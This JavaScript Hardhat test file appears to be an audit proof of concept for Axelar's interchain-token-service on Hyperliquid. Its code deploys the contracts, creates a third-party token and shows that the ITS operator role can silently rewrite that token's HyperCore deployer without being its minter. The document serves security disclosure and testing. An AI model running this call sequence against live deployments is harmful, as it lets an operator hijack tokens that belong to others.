'use strict';
/**
 * AUDIT — Axelar interchain-token-service v2.2.0 (repo commit 0f4b037)
 *
 * Finding: on a Hyperliquid ITS deployment, an address holding the ITS *OPERATOR*
 * role can rewrite the HyperCore `deployer` binding of ANY interchain token —
 * without being that token's minter, without the token's own operator agreeing,
 * and without governance/timelock.
 *
 * Location: contracts/hyperliquid/HyperliquidInterchainTokenService.sol:53-59
 *           (modifier onlyOperatorOrOwner)
 *           contracts/InterchainTokenService.sol:180-186 (operator role granted at setup)
 *
 * Run:  cp HyperliquidDeployerRoleBoundary.audit.js \
 *          <interchain-token-service>/test/audit/ && npx hardhat test test/audit/*.audit.js
 *
 * VERIFIED OUTPUT (see report): passes, deployer flips from address(0) to the
 * attacker-supplied address while the caller is not a minter of the token.
 */
const { ethers } = require('hardhat');
const { expect } = require('chai');
const { getRandomBytes32 } = require('../utils');
const { deployAll, deployContract } = require('../../scripts/deploy');
const { ITS_HUB_ADDRESS } = require('../constants');

describe('AUDIT Hyperliquid deployer binding', () => {
    it('ITS OPERATOR role can rewrite the HyperCore deployer of a third-party token it is not a minter of', async () => {
        const wallets = await ethers.getSigners();
        const owner = wallets[0];      // holds the ITS OPERATOR role (onlyOperatorOrOwner)
        const tokenMinter = wallets[2]; // independent third-party token owner (minter + manager operator)
        const salt = getRandomBytes32();

        // 1. deploy the Hyperliquid ITS variant (operator = owner by default in scripts/deploy.js)
        const d = await deployAll(owner, 'hyperliquid', ITS_HUB_ADDRESS, [], 'HyperliquidInterchainTokenService', 'HyperliquidInterchainTokenServiceFactory');
        const svc = d.service;
        const factory = d.tokenFactory;

        // 2. a third party deploys an interchain token; minter/operator = tokenMinter
        await (await factory.connect(tokenMinter).deployInterchainToken(salt, 'TestToken', 'TEST', 18, 0, tokenMinter.address)).wait();
        const tokenId = await factory.interchainTokenId(tokenMinter.address, salt);
        const token = await ethers.getContractAt('HyperliquidInterchainToken', await svc.registeredTokenAddress(tokenId), owner);
        const manager = await ethers.getContractAt('TokenManager', await svc.deployedTokenManager(tokenId), owner);

        // preconditions
        expect(await svc.isOperator(owner.address)).to.equal(true);
        expect(await manager.isOperator(tokenMinter.address)).to.equal(true);
        expect(await token.isMinter(owner.address)).to.equal(false);
        expect(await token.deployer()).to.equal(ethers.constants.AddressZero);

        // 3. one call silently re-binds the third-party token's HyperCore deployer
        await (await svc.connect(owner).updateTokenDeployer(tokenId, wallets[4].address)).wait();

        expect(await token.deployer()).to.equal(wallets[4].address);
    });
});
